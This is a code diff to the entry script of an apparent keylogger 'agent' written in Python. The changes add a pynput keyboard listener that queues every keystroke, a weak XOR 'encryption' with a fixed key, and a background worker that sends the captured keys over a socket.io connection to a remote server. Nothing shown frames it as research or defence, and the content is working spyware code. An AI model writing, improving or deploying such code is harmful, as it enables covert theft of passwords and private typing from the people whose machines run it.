@@ -1,29 +1,47 @@
+import queue
 import sys
+import threading
 
+from engineio import Client
 from pynput import keyboard
 
 from agent import key_handler
 from agent.print_credit import print_welcome
-from agent.socket_client import init_socket, disconnect_handler
+from agent.socket_client import init_socket, reconnect
+from agent.worker import do_work
+from shared.Encriptor import XorCharCipher
 
 debug = 'debug' in sys.argv # run with "python app.py debug" for local testing
-sio = init_socket(debug)
+
+cipher = XorCharCipher(77)
+
+keystrokes_queue = queue.Queue()
 
 
-def launch():
+def launch(sio: Client):
     print_welcome()
 
     sio.on('connect', lambda: print('Connected to server'))
-    sio.on('disconnect', lambda: disconnect_handler())
-    sio.on('res', lambda data: print('Message from server:', data))
-    listener = keyboard.Listener(on_press=lambda key: key_handler.on_key(key, sio))
+    # sio.on('disconnect', lambda x: reconnect() if sio.reason != "exit" else None)
+
+    threading.Thread(
+        target=do_work,
+        args=(sio, keystrokes_queue, cipher),
+        daemon=True
+    ).start()
+
+    listener = keyboard.Listener(on_press=lambda k: key_handler.on_key(k, keystrokes_queue))
     listener.start()
 
     sio.wait()
 
+
 def main():
+    sio = None  # define upfront
     try:
-        launch()
+        sio = init_socket(debug)
+        launch(sio)
     except KeyboardInterrupt:
-        # Handle Ctrl+C gracefully
-        sio.disconnect()
+        if sio and sio.connected:
+            sio.disconnect()
+        print("\n\nExiting...")
